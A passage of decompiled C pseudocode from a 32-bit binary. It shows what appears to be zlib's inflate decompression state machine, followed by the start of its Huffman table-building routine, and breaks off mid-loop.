        v2[12] = (void *)1;
        v5 = 0;
        *(_DWORD *)v3 = ~BYTE1(v134) & 2 | 9;
        v134 = 0;
        continue;
      case 1:
        while ( 2 )
        {
          if ( v5 < 0x10 )
          {
            if ( v132 )
            {
              v10 = *(unsigned __int8 *)Src;
              --v132;
              v134 += v10 << v5;
              Src = (char *)Src + 1;
              v5 += 8;
              continue;
            }
            goto LABEL_319;
          }
          break;
        }
        v11 = v134;
        v12 = (_BYTE)v134 == 8;
        *((_DWORD *)v3 + 4) = v134;
        if ( !v12 )
        {
          v2[6] = aUnknownCompres_0;
          goto LABEL_310;
        }
        if ( (v11 & 0xE000) != 0 )
        {
          v2[6] = aUnknownHeaderF;
          goto LABEL_310;
        }
        v13 = (unsigned int *)*((_DWORD *)v3 + 8);
        if ( v13 )
          *v13 = (v11 >> 8) & 1;
        if ( (v3[8] & 0x200) != 0 )
        {
          LOWORD(v129) = v134;
          *((_DWORD *)v3 + 6) = sub_1002854F(&v129, *((_DWORD *)v3 + 6), 2u);
        }
        v5 = 0;
        v134 = 0;
        *(_DWORD *)v3 = 2;
LABEL_42:
        while ( v5 < 0x20 )
        {
          if ( !v132 )
            goto LABEL_319;
          v14 = *(unsigned __int8 *)Src;
          --v132;
          v134 += v14 << v5;
          Src = (char *)Src + 1;
          v5 += 8;
        }
        v15 = *((_DWORD *)v3 + 8);
        if ( v15 )
          *(_DWORD *)(v15 + 4) = v134;
        if ( (v3[8] & 0x200) != 0 )
        {
          v129 = v134;
          *((_DWORD *)v3 + 6) = sub_1002854F(&v129, *((_DWORD *)v3 + 6), 4u);
        }
        v5 = 0;
        v134 = 0;
        *(_DWORD *)v3 = 3;
LABEL_50:
        while ( v5 < 0x10 )
        {
          if ( !v132 )
            goto LABEL_319;
          v16 = *(unsigned __int8 *)Src;
          --v132;
          v134 += v16 << v5;
          Src = (char *)Src + 1;
          v5 += 8;
        }
        v17 = *((_DWORD *)v3 + 8);
        if ( v17 )
        {
          *(_DWORD *)(v17 + 8) = (unsigned __int8)v134;
          *(_DWORD *)(*((_DWORD *)v3 + 8) + 12) = v134 >> 8;
        }
        if ( (v3[8] & 0x200) != 0 )
        {
          LOWORD(v129) = v134;
          *((_DWORD *)v3 + 6) = sub_1002854F(&v129, *((_DWORD *)v3 + 6), 2u);
        }
        v5 = 0;
        v134 = 0;
        *(_DWORD *)v3 = 4;
LABEL_56:
        if ( (v3[8] & 0x400) != 0 )
        {
          while ( v5 < 0x10 )
          {
            if ( !v132 )
              goto LABEL_319;
            v25 = *(unsigned __int8 *)Src;
            --v132;
            v134 += v25 << v5;
            Src = (char *)Src + 1;
            v5 += 8;
          }
          v26 = *((_DWORD *)v3 + 8);
          v27 = v134;
          *((_DWORD *)v3 + 16) = v134;
          if ( v26 )
            *(_DWORD *)(v26 + 20) = v27;
          if ( (v3[8] & 0x200) != 0 )
          {
            LOWORD(v129) = v134;
            *((_DWORD *)v3 + 6) = sub_1002854F(&v129, *((_DWORD *)v3 + 6), 2u);
          }
          v5 = 0;
          v134 = 0;
        }
        else
        {
          v18 = *((_DWORD *)v3 + 8);
          if ( v18 )
            *(_DWORD *)(v18 + 16) = 0;
        }
        *(_DWORD *)v3 = 5;
LABEL_60:
        if ( (v3[8] & 0x400) != 0 )
        {
          Size = *((_DWORD *)v3 + 16);
          v19 = Size;
          if ( Size > v132 )
            Size = v132;
          if ( Size )
          {
            v20 = (_DWORD *)*((_DWORD *)v3 + 8);
            if ( v20 )
            {
              v119 = v20[4];
              if ( v119 )
              {
                v21 = v20[5];
                v22 = v20[6];
                v23 = v21 - v19;
                if ( v23 + Size <= v22 )
                  v24 = Size;
                else
                  v24 = v22 - v23;
                memcpy((void *)(v23 + v119), Src, v24);
              }
            }
            if ( (v3[8] & 0x200) != 0 )
              *((_DWORD *)v3 + 6) = sub_1002854F(Src, *((_DWORD *)v3 + 6), Size);
            v132 -= Size;
            Src = (char *)Src + Size;
            *((_DWORD *)v3 + 16) -= Size;
          }
          if ( *((_DWORD *)v3 + 16) )
            goto LABEL_319;
        }
        *((_DWORD *)v3 + 16) = 0;
        *(_DWORD *)v3 = 6;
LABEL_83:
        if ( (v3[8] & 0x800) != 0 )
        {
          if ( !v132 )
            goto LABEL_319;
          v28 = 0;
          do
          {
            v29 = *((unsigned __int8 *)Src + v28);
            Size = v28 + 1;
            v30 = *((_DWORD *)v3 + 8);
            v121 = v29;
            if ( v30 )
            {
              if ( *(_DWORD *)(v30 + 28) )
              {
                v31 = *((_DWORD *)v3 + 16);
                if ( v31 < *(_DWORD *)(v30 + 32) )
                {
                  *(_BYTE *)(*(_DWORD *)(v30 + 28) + v31) = v29;
                  ++*((_DWORD *)v3 + 16);
                }
              }
            }
            if ( !v29 )
              break;
            v28 = Size;
          }
          while ( Size < v132 );
          if ( (v3[8] & 0x200) != 0 )
          {
            v32 = sub_1002854F(Src, *((_DWORD *)v3 + 6), Size);
            v29 = v121;
            *((_DWORD *)v3 + 6) = v32;
          }
          v132 -= Size;
          Src = (char *)Src + Size;
          if ( v29 )
            goto LABEL_319;
        }
        else
        {
          v33 = *((_DWORD *)v3 + 8);
          if ( v33 )
            *(_DWORD *)(v33 + 28) = 0;
        }
        *((_DWORD *)v3 + 16) = 0;
        *(_DWORD *)v3 = 7;
LABEL_99:
        if ( (v3[8] & 0x1000) != 0 )
        {
          if ( !v132 )
            goto LABEL_319;
          Size = 0;
          do
          {
            v34 = *((unsigned __int8 *)Src + Size);
            v35 = *((_DWORD *)v3 + 8);
            ++Size;
            v122 = v34;
            if ( v35 )
            {
              if ( *(_DWORD *)(v35 + 36) )
              {
                v36 = *((_DWORD *)v3 + 16);
                if ( v36 < *(_DWORD *)(v35 + 40) )
                {
                  *(_BYTE *)(*(_DWORD *)(v35 + 36) + v36) = v34;
                  ++*((_DWORD *)v3 + 16);
                }
              }
            }
          }
          while ( v34 && Size < v132 );
          if ( (v3[8] & 0x200) != 0 )
          {
            v37 = sub_1002854F(Src, *((_DWORD *)v3 + 6), Size);
            v34 = v122;
            *((_DWORD *)v3 + 6) = v37;
          }
          v132 -= Size;
          Src = (char *)Src + Size;
          if ( v34 )
            goto LABEL_319;
        }
        else
        {
          v38 = *((_DWORD *)v3 + 8);
          if ( v38 )
            *(_DWORD *)(v38 + 36) = 0;
        }
        *(_DWORD *)v3 = 8;
LABEL_115:
        if ( (v3[8] & 0x200) != 0 )
        {
          while ( v5 < 0x10 )
          {
            if ( !v132 )
              goto LABEL_319;
            v39 = *(unsigned __int8 *)Src;
            --v132;
            v134 += v39 << v5;
            Src = (char *)Src + 1;
            v5 += 8;
          }
          if ( v134 != v3[12] )
          {
            v2[6] = aHeaderCrcMisma;
            goto LABEL_310;
          }
          v5 = 0;
          v134 = 0;
        }
        v40 = *((_DWORD *)v3 + 8);
        if ( v40 )
        {
          *(_DWORD *)(v40 + 44) = (*((int *)v3 + 4) >> 9) & 1;
          *(_DWORD *)(*((_DWORD *)v3 + 8) + 48) = 1;
        }
        *((_DWORD *)v3 + 6) = 0;
        v2[12] = 0;
        goto LABEL_236;
      case 2:
        goto LABEL_42;
      case 3:
        goto LABEL_50;
      case 4:
        goto LABEL_56;
      case 5:
        goto LABEL_60;
      case 6:
        goto LABEL_83;
      case 7:
        goto LABEL_99;
      case 8:
        goto LABEL_115;
      case 9:
        while ( 2 )
        {
          if ( v5 < 0x20 )
          {
            if ( v132 )
            {
              v41 = *(unsigned __int8 *)Src;
              --v132;
              v134 += v41 << v5;
              Src = (char *)Src + 1;
              v5 += 8;
              continue;
            }
            goto LABEL_319;
          }
          break;
        }
        LOBYTE(v42) = 0;
        HIBYTE(v42) = BYTE2(v134);
        v43 = HIBYTE(v134) + v42 + (((v134 << 16) + (v134 & 0xFF00)) << 8);
        *((_DWORD *)v3 + 6) = v43;
        v5 = 0;
        v2[12] = (void *)v43;
        v134 = 0;
        *(_DWORD *)v3 = 10;
LABEL_130:
        if ( !*((_DWORD *)v3 + 3) )
        {
          v2[3] = v128;
          v2[4] = (void *)v130;
          *v2 = Src;
          v2[1] = (void *)v132;
          *((_DWORD *)v3 + 14) = v134;
          *((_DWORD *)v3 + 15) = v5;
          return 2;
        }
        *((_DWORD *)v3 + 6) = 1;
        v2[12] = (void *)1;
        *(_DWORD *)v3 = 11;
LABEL_132:
        if ( *((_DWORD *)v3 + 1) )
        {
          v44 = v5 & 7;
          v134 >>= v44;
          v5 -= v44;
          *(_DWORD *)v3 = 24;
        }
        else
        {
          while ( v5 < 3 )
          {
            if ( !v132 )
              goto LABEL_319;
            v45 = *(unsigned __int8 *)Src;
            --v132;
            v134 += v45 << v5;
            Src = (char *)Src + 1;
            v5 += 8;
          }
          v46 = v134;
          v134 >>= 1;
          *((_DWORD *)v3 + 1) = v46 & 1;
          v47 = v5 - 1;
          if ( (v134 & 3) != 0 )
          {
            switch ( v134 & 3 )
            {
              case 1u:
                *((_DWORD *)v3 + 19) = &unk_101019F8;
                *((_DWORD *)v3 + 21) = 9;
                *((_DWORD *)v3 + 20) = &unk_101021F8;
                *((_DWORD *)v3 + 22) = 5;
                *(_DWORD *)v3 = 18;
                break;
              case 2u:
                *(_DWORD *)v3 = 15;
                break;
              case 3u:
                v2[6] = aInvalidBlockTy;
                *(_DWORD *)v3 = 27;
                break;
            }
          }
          else
          {
            *(_DWORD *)v3 = 13;
          }
          v134 >>= 2;
          v5 = v47 - 2;
        }
        continue;
      case 0xA:
        goto LABEL_130;
      case 0xB:
      case 0xC:
        goto LABEL_132;
      case 0xD:
        v48 = v5 & 7;
        v134 >>= v48;
        v5 -= v48;
        while ( 2 )
        {
          if ( v5 < 0x20 )
          {
            if ( v132 )
            {
              v49 = *(unsigned __int8 *)Src;
              --v132;
              v134 += v49 << v5;
              Src = (char *)Src + 1;
              v5 += 8;
              continue;
            }
            goto LABEL_319;
          }
          break;
        }
        if ( (unsigned __int16)v134 != ~v134 >> 16 )
        {
          v2[6] = aInvalidStoredB;
          goto LABEL_310;
        }
        v5 = 0;
        *((_DWORD *)v3 + 16) = (unsigned __int16)v134;
        v134 = 0;
        *(_DWORD *)v3 = 14;
LABEL_153:
        Size = *((_DWORD *)v3 + 16);
        if ( !Size )
          goto LABEL_236;
        if ( Size > v132 )
          Size = v132;
        if ( Size > v130 )
          Size = v130;
        if ( !Size )
          goto LABEL_319;
        memcpy(v128, Src, Size);
        v132 -= Size;
        Src = (char *)Src + Size;
        v130 -= Size;
        v128 += Size;
        *((_DWORD *)v3 + 16) -= Size;
        continue;
      case 0xE:
        goto LABEL_153;
      case 0xF:
        while ( 2 )
        {
          if ( v5 < 0xE )
          {
            if ( v132 )
            {
              v50 = *(unsigned __int8 *)Src;
              --v132;
              v134 += v50 << v5;
              Src = (char *)Src + 1;
              v5 += 8;
              continue;
            }
            goto LABEL_319;
          }
          break;
        }
        v51 = v134;
        v134 >>= 5;
        *((_DWORD *)v3 + 24) = (v51 & 0x1F) + 257;
        v52 = v134;
        v134 >>= 5;
        *((_DWORD *)v3 + 25) = (v52 & 0x1F) + 1;
        v53 = v134;
        v134 >>= 4;
        v5 -= 14;
        v54 = *((_DWORD *)v3 + 24) <= 0x11Eu;
        *((_DWORD *)v3 + 23) = (v53 & 0xF) + 4;
        if ( !v54 || *((_DWORD *)v3 + 25) > 0x1Eu )
        {
          v2[6] = aTooManyLengthO;
          goto LABEL_310;
        }
        *((_DWORD *)v3 + 26) = 0;
        *(_DWORD *)v3 = 16;
LABEL_171:
        while ( *((_DWORD *)v3 + 26) < *((_DWORD *)v3 + 23) )
        {
          while ( v5 < 3 )
          {
            if ( !v132 )
              goto LABEL_319;
            v55 = *(unsigned __int8 *)Src;
            --v132;
            v134 += v55 << v5;
            Src = (char *)Src + 1;
            v5 += 8;
          }
          v56 = v134;
          v57 = (unsigned __int16)word_10102278[*((_DWORD *)v3 + 26)];
          v134 >>= 3;
          v3[v57 + 56] = v56 & 7;
          ++*((_DWORD *)v3 + 26);
          v5 -= 3;
        }
        while ( *((_DWORD *)v3 + 26) < 0x13u )
          v3[(unsigned __int16)word_10102278[(*((_DWORD *)v3 + 26))++] + 56] = 0;
        *((_DWORD *)v3 + 27) = v3 + 664;
        *((_DWORD *)v3 + 19) = v3 + 664;
        *((_DWORD *)v3 + 21) = 7;
        v126 = sub_10027B8E((_DWORD **)v3 + 27, 0, (int)(v3 + 56), 0x13u, (unsigned int *)v3 + 21, v3 + 376);
        if ( v126 )
        {
          v58 = a1;
          a1[6] = aInvalidCodeLen;
LABEL_177:
          v2 = v58;
          goto LABEL_310;
        }
        *((_DWORD *)v3 + 26) = 0;
        v2 = a1;
        *(_DWORD *)v3 = 17;
        while ( 1 )
        {
          while ( 1 )
          {
LABEL_213:
            if ( *((_DWORD *)v3 + 26) >= (unsigned int)(*((_DWORD *)v3 + 24) + *((_DWORD *)v3 + 25)) )
              goto LABEL_208;
            while ( 1 )
            {
              v60 = *(_DWORD *)(*((_DWORD *)v3 + 19) + 4 * (v134 & ((1 << *((_DWORD *)v3 + 21)) - 1)));
              if ( BYTE1(v60) <= v5 )
                break;
              if ( !v132 )
                goto LABEL_319;
              v59 = *(unsigned __int8 *)Src;
              --v132;
              v134 += v59 << v5;
              Src = (char *)Src + 1;
              v5 += 8;
            }
            if ( HIWORD(v60) >= 0x10u )
              break;
            v61 = BYTE1(v60);
            while ( v5 < v61 )
            {
              if ( !v132 )
                goto LABEL_319;
              v62 = *(unsigned __int8 *)Src;
              --v132;
              v61 = BYTE1(v60);
              v134 += v62 << v5;
              Src = (char *)Src + 1;
              v5 += 8;
            }
            v134 >>= SBYTE1(v60);
            v5 -= BYTE1(v60);
            v3[(*((_DWORD *)v3 + 26))++ + 56] = HIWORD(v60);
          }
          if ( HIWORD(v60) == 16 )
          {
            v63 = BYTE1(v60);
            while ( v5 < v63 + 2 )
            {
              if ( !v132 )
                goto LABEL_319;
              v64 = *(unsigned __int8 *)Src;
              --v132;
              v134 += v64 << v5;
              Src = (char *)Src + 1;
              v5 += 8;
            }
            v134 >>= v63;
            v5 -= v63;
            v65 = *((_DWORD *)v3 + 26);
            if ( !v65 )
            {
              v2[6] = aInvalidBitLeng_0;
              goto LABEL_310;
            }
            v123 = v3[v65 + 55];
            v66 = v134;
            v134 >>= 2;
            v67 = (v66 & 3) + 3;
            v5 -= 2;
          }
          else
          {
            v68 = BYTE1(v60);
            if ( HIWORD(v60) == 17 )
            {
              while ( v5 < v68 + 3 )
              {
                if ( !v132 )
                  goto LABEL_319;
                v69 = *(unsigned __int8 *)Src;
                --v132;
                v134 += v69 << v5;
                Src = (char *)Src + 1;
                v5 += 8;
              }
              v134 >>= v68;
              v67 = (v134 & 7) + 3;
              v134 >>= 3;
              v115 = -3;
            }
            else
            {
              while ( v5 < v68 + 7 )
              {
                if ( !v132 )
                  goto LABEL_319;
                v70 = *(unsigned __int8 *)Src;
                --v132;
                v134 += v70 << v5;
                Src = (char *)Src + 1;
                v5 += 8;
              }
              v134 >>= v68;
              v67 = (v134 & 0x7F) + 11;
              v134 >>= 7;
              v115 = -7;
            }
            v123 = 0;
            v5 += v115 - v68;
          }
          if ( v67 + *((_DWORD *)v3 + 26) > (unsigned int)(*((_DWORD *)v3 + 24) + *((_DWORD *)v3 + 25)) )
            break;
          while ( v67 )
          {
            --v67;
            v3[(*((_DWORD *)v3 + 26))++ + 56] = v123;
          }
        }
        v2[6] = aInvalidBitLeng;
        *(_DWORD *)v3 = 27;
LABEL_208:
        if ( *(_DWORD *)v3 == 27 )
          continue;
        v71 = (_DWORD **)(v3 + 54);
        *((_DWORD *)v3 + 27) = v3 + 664;
        *((_DWORD *)v3 + 19) = v3 + 664;
        v113 = *((_DWORD *)v3 + 24);
        *((_DWORD *)v3 + 21) = 9;
        v126 = sub_10027B8E((_DWORD **)v3 + 27, 1, (int)(v3 + 56), v113, (unsigned int *)v3 + 21, v3 + 376);
        if ( v126 )
        {
          v58 = a1;
          a1[6] = aInvalidLiteral;
          goto LABEL_177;
        }
        *((_DWORD *)v3 + 20) = *v71;
        v114 = *((_DWORD *)v3 + 25);
        *((_DWORD *)v3 + 22) = 6;
        v126 = sub_10027B8E(v71, 2, (int)&v3[*((_DWORD *)v3 + 24) + 56], v114, (unsigned int *)v3 + 22, v3 + 376);
        if ( v126 )
        {
          v58 = a1;
          a1[6] = aInvalidDistanc;
          goto LABEL_177;
        }
        v2 = a1;
        *(_DWORD *)v3 = 18;
LABEL_219:
        if ( v132 >= 6 && v130 >= 0x102 )
        {
          v2[3] = v128;
          v2[4] = (void *)v130;
          *v2 = Src;
          v2[1] = (void *)v132;
          *((_DWORD *)v3 + 14) = v134;
          *((_DWORD *)v3 + 15) = v5;
          sub_10028173(v2, v127);
          v5 = *((_DWORD *)v3 + 15);
          v128 = (char *)v2[3];
          v130 = (size_t)v2[4];
          Src = *v2;
          v132 = (size_t)v2[1];
          v134 = *((_DWORD *)v3 + 14);
          continue;
        }
        for ( i = *(_DWORD *)(*((_DWORD *)v3 + 19) + 4 * (v134 & ((1 << *((_DWORD *)v3 + 21)) - 1)));
              BYTE1(i) > v5;
              i = *(_DWORD *)(*((_DWORD *)v3 + 19) + 4 * (v134 & ((1 << v75) - 1))) )
        {
          if ( !v132 )
            goto LABEL_319;
          v73 = *(unsigned __int8 *)Src;
          --v132;
          v74 = v73 << v5;
          v75 = *((_DWORD *)v3 + 21);
          v5 += 8;
          v134 += v74;
          Src = (char *)Src + 1;
        }
        if ( (_BYTE)i && (i & 0xF0) == 0 )
        {
          Size = i >> 8;
          v124 = i;
          i = *(_DWORD *)(*((_DWORD *)v3 + 19) + 4 * (HIWORD(i) + ((v134 & ((1 << (BYTE1(i) + i)) - 1)) >> SBYTE1(i))));
          v76 = (unsigned __int8)Size;
          while ( v76 + (unsigned int)BYTE1(i) > v5 )
          {
            if ( !v132 )
              goto LABEL_319;
            v77 = *(unsigned __int8 *)Src;
            --v132;
            v76 = BYTE1(v124);
            v134 += v77 << v5;
            Src = (char *)Src + 1;
            v5 += 8;
            i = *(_DWORD *)(*((_DWORD *)v3 + 19)
                          + 4 * (HIWORD(v124) + ((v134 & ((1 << (BYTE1(v124) + v124)) - 1)) >> SBYTE1(v124))));
          }
          v134 >>= SBYTE1(v124);
          v5 -= BYTE1(v124);
        }
        v134 >>= SBYTE1(i);
        v5 -= BYTE1(i);
        *((_DWORD *)v3 + 16) = HIWORD(i);
        if ( !(_BYTE)i )
        {
          *(_DWORD *)v3 = 23;
          continue;
        }
        if ( (i & 0x20) != 0 )
        {
LABEL_236:
          *(_DWORD *)v3 = 11;
          continue;
        }
        if ( (i & 0x40) != 0 )
        {
          v2[6] = aInvalidLiteral_0;
          goto LABEL_310;
        }
        *((_DWORD *)v3 + 18) = i & 0xF;
        *(_DWORD *)v3 = 19;
LABEL_240:
        v78 = *((_DWORD *)v3 + 18);
        if ( v78 )
        {
          if ( v5 < v78 )
          {
            while ( v132 )
            {
              v79 = *(unsigned __int8 *)Src;
              --v132;
              v80 = v79 << v5;
              v5 += 8;
              v134 += v80;
              Src = (char *)Src + 1;
              if ( v5 >= *((_DWORD *)v3 + 18) )
                goto LABEL_244;
            }
            goto LABEL_319;
          }
LABEL_244:
          v81 = v134 & ((1 << v78) - 1);
          v134 >>= v78;
          *((_DWORD *)v3 + 16) += v81;
          v5 -= v78;
        }
        *(_DWORD *)v3 = 20;
LABEL_246:
        for ( j = *(_DWORD *)(*((_DWORD *)v3 + 20) + 4 * (v134 & ((1 << *((_DWORD *)v3 + 22)) - 1)));
              BYTE1(j) > v5;
              j = *(_DWORD *)(*((_DWORD *)v3 + 20) + 4 * (v134 & ((1 << v85) - 1))) )
        {
          if ( !v132 )
            goto LABEL_319;
          v83 = *(unsigned __int8 *)Src;
          --v132;
          v84 = v83 << v5;
          v85 = *((_DWORD *)v3 + 22);
          v5 += 8;
          v134 += v84;
          Src = (char *)Src + 1;
        }
        if ( (j & 0xF0) == 0 )
        {
          Size = j >> 8;
          v125 = j;
          j = *(_DWORD *)(*((_DWORD *)v3 + 20) + 4 * (HIWORD(j) + ((v134 & ((1 << (BYTE1(j) + j)) - 1)) >> SBYTE1(j))));
          v86 = (unsigned __int8)Size;
          while ( v86 + (unsigned int)BYTE1(j) > v5 )
          {
            if ( !v132 )
              goto LABEL_319;
            v87 = *(unsigned __int8 *)Src;
            --v132;
            v86 = BYTE1(v125);
            v134 += v87 << v5;
            Src = (char *)Src + 1;
            v5 += 8;
            j = *(_DWORD *)(*((_DWORD *)v3 + 20)
                          + 4 * (HIWORD(v125) + ((v134 & ((1 << (BYTE1(v125) + v125)) - 1)) >> SBYTE1(v125))));
          }
          v134 >>= SBYTE1(v125);
          v5 -= BYTE1(v125);
        }
        v134 >>= SBYTE1(j);
        v5 -= BYTE1(j);
        if ( (j & 0x40) != 0 )
        {
          v2[6] = aInvalidDistanc_0;
          goto LABEL_310;
        }
        *((_DWORD *)v3 + 17) = HIWORD(j);
        *((_DWORD *)v3 + 18) = j & 0xF;
        *(_DWORD *)v3 = 21;
LABEL_259:
        v88 = *((_DWORD *)v3 + 18);
        if ( v88 )
        {
          if ( v5 < v88 )
          {
            while ( v132 )
            {
              v89 = *(unsigned __int8 *)Src;
              --v132;
              v90 = v89 << v5;
              v5 += 8;
              v134 += v90;
              Src = (char *)Src + 1;
              if ( v5 >= *((_DWORD *)v3 + 18) )
                goto LABEL_263;
            }
            goto LABEL_319;
          }
LABEL_263:
          v91 = v134 & ((1 << v88) - 1);
          v134 >>= v88;
          *((_DWORD *)v3 + 17) += v91;
          v5 -= v88;
        }
        if ( *((_DWORD *)v3 + 17) > v127 + *((_DWORD *)v3 + 11) - v130 )
        {
          v2[6] = aInvalidDistanc_1;
          goto LABEL_310;
        }
        *(_DWORD *)v3 = 22;
LABEL_267:
        if ( !v130 )
          goto LABEL_319;
        v92 = *((_DWORD *)v3 + 17);
        if ( v92 <= v127 - v130 )
        {
          v96 = &v128[-v92];
          v97 = *((_DWORD *)v3 + 16);
          v120 = v97;
LABEL_275:
          Size = v97;
          goto LABEL_276;
        }
        v93 = *((_DWORD *)v3 + 13);
        Size = v92 - (v127 - v130);
        v94 = *((_DWORD *)v3 + 12);
        if ( Size <= v94 )
        {
          v96 = (char *)(v94 + v93 - Size);
        }
        else
        {
          v95 = *((_DWORD *)v3 + 10) + v93;
          Size -= v94;
          v96 = (char *)(v95 - Size);
        }
        v97 = *((_DWORD *)v3 + 16);
        v120 = v97;
        if ( Size > v97 )
          goto LABEL_275;
LABEL_276:
        if ( Size > v130 )
          Size = v130;
        v130 -= Size;
        *((_DWORD *)v3 + 16) = v120 - Size;
        do
        {
          v98 = v128;
          v99 = *v96;
          ++v128;
          ++v96;
          v12 = Size-- == 1;
          *v98 = v99;
        }
        while ( !v12 );
        if ( !*((_DWORD *)v3 + 16) )
LABEL_284:
          *(_DWORD *)v3 = 18;
        continue;
      case 0x10:
        goto LABEL_171;
      case 0x11:
        goto LABEL_213;
      case 0x12:
        goto LABEL_219;
      case 0x13:
        goto LABEL_240;
      case 0x14:
        goto LABEL_246;
      case 0x15:
        goto LABEL_259;
      case 0x16:
        goto LABEL_267;
      case 0x17:
        if ( !v130 )
          goto LABEL_319;
        v100 = v128;
        v101 = *((_BYTE *)v3 + 64);
        ++v128;
        --v130;
        *v100 = v101;
        goto LABEL_284;
      case 0x18:
        if ( !*((_DWORD *)v3 + 2) )
          goto LABEL_301;
        while ( 2 )
        {
          if ( v5 < 0x20 )
          {
            if ( v132 )
            {
              v102 = *(unsigned __int8 *)Src;
              --v132;
              v134 += v102 << v5;
              Src = (char *)Src + 1;
              v5 += 8;
              continue;
            }
            goto LABEL_319;
          }
          break;
        }
        v103 = v127 - v130;
        v2[5] = (char *)v2[5] + v127 - v130;
        *((_DWORD *)v3 + 7) += v103;
        if ( v103 )
        {
          if ( *((_DWORD *)v3 + 4) )
            v104 = sub_1002854F(&v128[-v103], *((_DWORD *)v3 + 6), v103);
          else
            v104 = sub_10027F59(*((_DWORD *)v3 + 6), (unsigned __int8 *)&v128[-v103], v103);
          *((_DWORD *)v3 + 6) = v104;
          v2[12] = (void *)v104;
        }
        v127 = v130;
        if ( a2 )
        {
          v105 = v134;
          if ( !*((_DWORD *)v3 + 4) )
          {
            LOBYTE(v106) = 0;
            HIBYTE(v106) = BYTE2(v134);
            v105 = HIBYTE(v134) + v106 + (((v134 << 16) + (v134 & 0xFF00)) << 8);
          }
          if ( v105 != *((_DWORD *)v3 + 6) )
          {
            v2[6] = aIncorrectDataC;
            goto LABEL_310;
          }
        }
        v5 = 0;
        v134 = 0;
LABEL_301:
        *(_DWORD *)v3 = 25;
LABEL_302:
        if ( !*((_DWORD *)v3 + 2) || !*((_DWORD *)v3 + 4) )
          goto LABEL_316;
        while ( v5 < 0x20 )
        {
          if ( !v132 )
            goto LABEL_319;
          v107 = *(unsigned __int8 *)Src;
          --v132;
          v134 += v107 << v5;
          Src = (char *)Src + 1;
          v5 += 8;
        }
        if ( v134 != *((_DWORD *)v3 + 7) )
        {
          v2[6] = aIncorrectLengt;
LABEL_310:
          *(_DWORD *)v3 = 27;
          continue;
        }
        v5 = 0;
        v134 = 0;
LABEL_316:
        *(_DWORD *)v3 = 26;
LABEL_317:
        v126 = 1;
LABEL_319:
        v2[3] = v128;
        v2[4] = (void *)v130;
        *v2 = Src;
        v2[1] = (void *)v132;
        v12 = *((_DWORD *)v3 + 10) == 0;
        *((_DWORD *)v3 + 14) = v134;
        *((_DWORD *)v3 + 15) = v5;
        if ( v12 && (*(int *)v3 >= 24 || (void *)v127 == v2[4]) || !sub_100268BA(v127, (int)v2) )
        {
          v109 = v117 - (_DWORD)v2[1];
          v110 = v127 - (_DWORD)v2[4];
          v2[2] = (char *)v2[2] + v109;
          v2[5] = (char *)v2[5] + v110;
          *((_DWORD *)v3 + 7) += v110;
          v118 = v109;
          if ( *((_DWORD *)v3 + 2) && v110 )
          {
            if ( *((_DWORD *)v3 + 4) )
              v111 = sub_1002854F((char *)v2[3] - v110, *((_DWORD *)v3 + 6), v110);
            else
              v111 = sub_10027F59(*((_DWORD *)v3 + 6), (unsigned __int8 *)v2[3] - v110, v110);
            *((_DWORD *)v3 + 6) = v111;
            v2[12] = (void *)v111;
            v109 = v118;
          }
          if ( *(_DWORD *)v3 == 11 )
            v112 = 128;
          else
            v112 = 0;
          v2[11] = (void *)(*((_DWORD *)v3 + 15) + v112 + (*((_DWORD *)v3 + 1) != 0 ? 0x40 : 0));
          if ( !v109 && !v110 && !v126 )
            return -5;
          return v126;
        }
        else
        {
          *(_DWORD *)v3 = 28;
          return -4;
        }
      case 0x19:
        goto LABEL_302;
      case 0x1A:
        goto LABEL_317;
      case 0x1B:
        v126 = -3;
        goto LABEL_319;
      case 0x1C:
        return -4;
      default:
        return -2;
    }
  }
}
// 10102278: using guessed type __int16 word_10102278[20];

//----- (10027B8E) --------------------------------------------------------
int __usercall sub_10027B8E@<eax>(_DWORD **a1@<esi>, int a2, int a3, unsigned int a4, unsigned int *a5, _WORD *a6)
{
  unsigned int i; // ecx
  __int16 *v7; // eax
  unsigned int v8; // ecx
  unsigned int v9; // eax
  int result; // eax
  unsigned int v11; // ecx
  unsigned int j; // edx
  int v13; // edi
  unsigned int v14; // ebx
  unsigned int k; // ecx
  __int16 v16; // ax
  unsigned int v17; // ecx
  unsigned int m; // edi
  _WORD *v19; // eax
  bool v20; // zf
  _DWORD *v21; // edi
  unsigned int v22; // eax
  int v23; // ecx
  int v24; // edx
  _DWORD *v25; // ecx
  unsigned int n; // edx
  __int16 *v27; // ecx
  char v28; // cl
  int v29; // edx
  __int16 *ii; // eax
  int v31; // edx
  int v32; // edx
  unsigned int jj; // edx
  unsigned int v34; // ecx
  __int16 v35[16]; // [esp+4h] [ebp-80h]
  __int16 v36[16]; // [esp+24h] [ebp-60h] BYREF
  int v37; // [esp+44h] [ebp-40h]
  signed int v38; // [esp+48h] [ebp-3Ch]
  int v39; // [esp+4Ch] [ebp-38h]
  unsigned int v40; // [esp+50h] [ebp-34h]
  unsigned int v41; // [esp+54h] [ebp-30h]
  int v42; // [esp+58h] [ebp-2Ch]
  char *v43; // [esp+5Ch] [ebp-28h]
  _BYTE *v44; // [esp+60h] [ebp-24h]
  unsigned int v45; // [esp+64h] [ebp-20h]
  unsigned int v46; // [esp+68h] [ebp-1Ch]
  unsigned int v47; // [esp+6Ch] [ebp-18h]
  unsigned int v48; // [esp+70h] [ebp-14h]
  int v49; // [esp+74h] [ebp-10h]
  _WORD *v50; // [esp+78h] [ebp-Ch]
  unsigned int v51; // [esp+7Ch] [ebp-8h]
  unsigned int v52; // [esp+80h] [ebp-4h]
  int v53; // [esp+94h] [ebp+10h]
  int v54; // [esp+94h] [ebp+10h]

  memset(v36, 0, sizeof(v36));
  for ( i = 0; i < a4; ++i )
  {
    v7 = &v36[*(unsigned __int16 *)(a3 + 2 * i)];
    ++*v7;
  }
  v8 = *a5;
  v9 = 15;
  v51 = *a5;
  v47 = 15;
  do
  {
    if ( v36[v9] )
      break;
    v47 = --v9;
  }
  while ( v9 );
  if ( v8 > v9 )
    v51 = v9;
  if ( !v9 )
  {
    *(*a1)++ = 320;
    *(*a1)++ = 320;
    *a5 = 1;
    return 0;
  }
  v11 = 1;
  for ( j = 1; j <= 0xF; ++j )
  {
    if ( v36[j] )
      break;
  }
  if ( v51 < j )
    v51 = j;
  v13 = 1;
  do
  {
    v13 = 2 * v13 - (unsigned __int16)v36[v11];
    if ( v13 < 0 )
      return -1;
    ++v11;
  }
  while ( v11 <= 0xF );
  v14 = 0;
  if ( v13 > 0 && (!a2 || v9 != 1) )
    return -1;
  v35[1] = 0;
  for ( k = 2; k < 0x1E; k = v17 + 1 )
  {
